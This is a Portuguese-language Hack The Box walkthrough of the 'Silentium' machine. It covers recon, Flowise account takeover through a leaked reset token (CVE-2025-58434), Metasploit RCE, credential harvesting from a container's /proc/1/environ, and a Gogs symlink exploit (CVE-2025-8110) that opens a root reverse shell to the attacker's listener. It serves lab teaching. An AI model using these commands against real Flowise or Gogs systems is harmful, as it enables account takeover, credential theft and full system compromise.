# Hack The Box: Silentium

**Sistema:** Linux (Ubuntu 24.04) **Flags obtidas:** user.txt ✅ | root.txt ✅

## Sumário

|Etapa|Técnica|
|---|---|
|Reconhecimento|Nmap, Gobuster dir, Gobuster vhost|
|Acesso inicial|CVE-2025-58434 + Metasploit (flowise_js_rce)|
|Flag de usuário|SSH como ben|
|Escalada de privilégio|CVE-2025-8110 (Gogs RCE)|
|Flag de root|Reverse shell como root|

---

## 1. Reconhecimento

### 1.1 Configuração de VPN e /etc/hosts

Após conectar à VPN do HTB e obter o IP da máquina, tentei acessá-lo diretamente no navegador sem sucesso. O servidor exigia acesso por nome de domínio, então adicionei a entrada ao `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Adicione no final do arquivo:

```
10.129.34.37 silentium.htb
```

Salve com `Ctrl+O`, Enter, depois `Ctrl+X`.

![[Pasted image 20261102213829.png]]
### 1.2 Scan de portas com Nmap

```bash
nmap -sV -T4 10.129.34.37
```

**Resultado:** Apenas as portas 22 (SSH) e 80 (HTTP) abertas.

![[Pasted image 20261102213948.png]]

### 1.3 Análise do site

Ao acessar `http://silentium.htb`, o site apresenta apenas uma página institucional com os nomes dos criadores — sem formulários de login ou funcionalidades úteis. A análise do HTML também não revelou pistas relevantes.

![[Pasted image 20261102214008.png]]

> **Dica:** Anote os nomes exibidos no site. Em CTFs, nomes de colaboradores costumam ser dicas de usuários válidos no sistema. Aqui, o nome `ben` será importante mais à frente.

### 1.4 Enumeração de diretórios com Gobuster

```bash
gobuster dir -u http://silentium.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 8753
```

**Por que `--exclude-length 8753`?** O servidor retorna HTTP 200 para qualquer URL inexistente, sempre com o mesmo tamanho de resposta (8753 bytes). Sem esse filtro, o Gobuster considera tudo como válido. Ao excluir esse tamanho, apenas respostas com conteúdo diferente (páginas reais) aparecem.

**Resultado:** Apenas `/assets` encontrado (redirect 301) — sem conteúdo útil.

![[Pasted image 20261102214032.png]]

### 1.5 Enumeração de subdomínios com Gobuster vhost

Além de diretórios, é importante enumerar subdomínios, pois o conteúdo útil pode estar em algo como `admin.silentium.htb` ou `staging.silentium.htb`.

Se ainda não tiver o Seclists instalado:

```bash
sudo apt install seclists -y
```

```bash
gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

**Resultado:** Subdomínio encontrado: `staging.silentium.htb` (Status 200, tamanho 3142)

![[Pasted image 20261102214044.png]]

Adicione o subdomínio ao `/etc/hosts` na mesma linha do IP:

```
10.129.34.37 silentium.htb staging.silentium.htb
```

![[Pasted image 20261102214058.png]]

---

## 2. Acesso Inicial

### 2.1 Identificação do serviço

Ao acessar `http://staging.silentium.htb`, é encontrada uma página de login do **Flowise** — uma plataforma de criação de agentes de IA.

![[Pasted image 20261102214113.png]]

### 2.2 CVE-2025-58434 — Password Reset Token Disclosure (CVSS 9.8)

**Referência:** GHSA-wgpv-6j63-x5ph

Flowise ≤ 3.0.5 possui uma vulnerabilidade crítica: o endpoint `/api/v1/account/forgot-password` retorna o token de reset de senha diretamente na resposta da API, sem qualquer autenticação ou envio por e-mail.

Essa falha existe por um erro de implementação — o desenvolvedor provavelmente adicionou o token na resposta HTTP durante o desenvolvimento para facilitar testes, mas esqueceu de remover esse comportamento antes do deploy em produção. É um erro conhecido como _debug code left in production_.

O e-mail do `ben` foi deduzido como `ben@silentium.htb` com base no nome encontrado no site.

**Passo 1 — Obter o tempToken:**

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

A resposta retorna o `tempToken` diretamente no JSON — algo que só deveria ser enviado por e-mail.

![[Pasted image 20261102214143.png]]

**Passo 2 — Redefinir a senha com o token obtido:**

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"SEU_TOKEN_AQUI","password":"Senha123!"}}'
```

O retorno `201 Created` confirma que a senha foi redefinida com sucesso.

![[Pasted image 20261102214157.png]]

Faça login no site com `ben@silentium.htb` / `Senha123!` para confirmar o acesso.

![[Pasted image 20261102214209.png]]

### 2.3 RCE via Metasploit — flowise_js_rce

Com as credenciais em mãos, utilize o Metasploit para obter execução remota de código:

```
msfconsole
search flowise
use 3
```

O módulo correto é `exploit/multi/http/flowise_js_rce`. 

![[Pasted image 20261102214250.png]]

Veja as opções disponíveis com `show options`.

![[Pasted image 20261102214325.png]]

Configure as opções uma por vez, dando Enter após cada comando:

```
set RHOSTS 10.129.34.37
set VHOST staging.silentium.htb
set RPORT 80
set LHOST 10.10.15.79
set FLOWISE_EMAIL ben@silentium.htb
set FLOWISE_PASSWORD Senha123!
run
```

Substitua o `LHOST` pelo seu IP da VPN (visível no canto superior direito da interface HTB).

**Resultado:** Sessão Meterpreter aberta com sucesso.

![[Pasted image 20261102214335.png]]

---

## 3. Flag de Usuário

### 3.1 Reconhecimento dentro do container Docker

Após obter a sessão Meterpreter, ao entrar no shell percebemos que estamos dentro de um container Docker — e não no sistema host diretamente.

Para encontrar informações úteis, listamos as variáveis de ambiente do processo principal do container:

```
shell
cat /proc/1/environ | tr '\0' '\n'
```

O comando `cat /proc/1/environ` lê as variáveis de ambiente do processo de PID 1 (processo raiz do container). O `tr '\0' '\n'` converte os separadores nulos em quebras de linha para facilitar a leitura.

![[Pasted image 20261102214458.png]]

Entre as variáveis encontradas, destaca-se:

```
FLOWISE_PASSWORD=F1l3_d0ck3r
```

 a senha real do usuário `ben` no sistema host.

### 3.2 Acesso SSH e flag de usuário

Com a senha encontrada, abrimos um novo terminal e nos conectamos via SSH diretamente no sistema host (fora do container):

```bash
ssh ben@10.129.34.37
```

Use a senha `F1l3_d0ck3r` quando solicitado.

```bash
cat user.txt
```

![[Pasted image 20261102214604.png]]

```
818714570b770fc0ccc6368bee62ce78
```

---

## 4. Escalada de Privilégio

### 4.1 Identificando serviços internos

Dentro da sessão SSH como `ben`, verificamos quais serviços estão rodando internamente:

```bash
netstat -tulpn | grep 127.0.0.1
```

![[Pasted image 20261102214628.png]]

A porta 3001 está escutando apenas em localhost — inacessível externamente. Precisamos de um tunelamento para acessá-la.

### 4.2 Tunelamento SSH para a porta 3001

Abra um novo terminal no Kali e crie o túnel SSH:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.34.37
```

Use a senha `F1l3_d0ck3r`. Enquanto esse terminal estiver aberto, o túnel estará ativo.

![[Pasted image 20261102214653.png]]

Acesse `http://localhost:3001` no navegador do Kali. Você encontrará uma instância do **Gogs** — uma plataforma de hospedagem Git auto-gerenciada, similar ao GitHub.

![[Pasted image 20261102214705.png]]

### 4.3 Criando conta e gerando token no Gogs

Para usar o exploit, você precisará de uma conta e um token de API no Gogs:

1. Acesse `http://localhost:3001`
2. Clique em **Register** e crie uma conta (anote o usuário e senha)

![[Pasted image 20261102214746.png]]

3. Após fazer login, clique no ícone do seu perfil → **Settings** → **Applications**
4. Em **Manage Personal Access Tokens**, dê um nome qualquer e clique em **Generate Token**
5. Copie o token imediatamente — ele não será exibido novamente

![[Pasted image 20261102214802.png]]

### 4.4 CVE-2025-8110 — Gogs RCE via Symlink

**Referência:** CVE-2025-8110-Gogs-RCE-Exploit

O Gogs possui uma vulnerabilidade na API `PutContents` que não valida se o caminho de um arquivo é um symlink. O exploit abusa disso para:

1. Criar um repositório no Gogs
2. Criar um symlink dentro do repositório apontando para o `.git/config` interno do Gogs
3. Usar a API para sobrescrever esse arquivo via symlink, injetando um `sshCommand` malicioso
4. Quando o Gogs processa um commit, o `sshCommand` é executado — gerando um reverse shell

Como o Gogs roda como `root` nessa máquina, o shell recebido já é root.

**Instalando dependências e clonando o exploit:**

```bash
python3 -m venv venv
source venv/bin/activate
pip install requests rich beautifulsoup4
git clone https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit.git
cd CVE-2025-8110-Gogs-RCE-Exploit
```

![[Pasted image 20261102214820.png]]

**Terminal 1 — Inicie o listener ANTES de rodar o exploit:**

```bash
nc -lvnp 5555
```

![[Pasted image 20261102214829.png]]

**Terminal 2 — Execute o exploit (dentro do venv ativado):**

```bash
python3 exploit.py -u http://localhost:3001 -un SEU_USUARIO -pw SUA_SENHA -t SEU_TOKEN -lh 10.10.15.79 -lp 5555
```

Substitua `SEU_USUARIO`, `SUA_SENHA` e `SEU_TOKEN` pelos dados da conta que você criou no Gogs. O `-lh` deve ser o seu IP da VPN.

> **Dica:** Se o script travar após "Overwriting .git/config", é sinal de que o reverse shell conectou com sucesso. Verifique o Terminal 1.

![[Pasted image 20261102214918.png]]

**Resultado:** Reverse shell recebido como root no Terminal 1.

![[Pasted image 20261102214931.png]]

---

## 5. Flag de Root

No shell root recebido pelo netcat:

```bash
whoami
cat /root/root.txt
```

```
5b7cc2c5dab074f02331cd41dbe7bce1
```

![[Pasted image 20261102214954.png]]

---

## 6. CVEs Exploradas

|CVE|Serviço|Impacto|Link|
|---|---|---|---|
|CVE-2025-58434|Flowise ≤ 3.0.5|Account Takeover sem autenticação|Advisory|
|CVE-2025-8110|Gogs|RCE como root via symlink no PutContents API|Exploit|

---

## 7. Linha do Tempo

```
Reconhecimento
└─ nmap → portas 22 e 80
└─ gobuster dir → apenas /assets
└─ gobuster vhost → staging.silentium.htb

Acesso Inicial
└─ CVE-2025-58434 → senha do ben resetada via token vazado
└─ Metasploit flowise_js_rce → shell dentro do container Docker

Reconhecimento no container
└─ cat /proc/1/environ → senha F1l3_d0ck3r encontrada

Flag user.txt ✅ (via SSH com a senha encontrada no container)

Escalada de Privilégio
└─ netstat → porta 3001 interna (Gogs)
└─ SSH tunnel → acesso ao Gogs via localhost:3001
└─ Conta criada + token gerado no Gogs
└─ CVE-2025-8110 → reverse shell como root via symlink

Flag root.txt ✅
```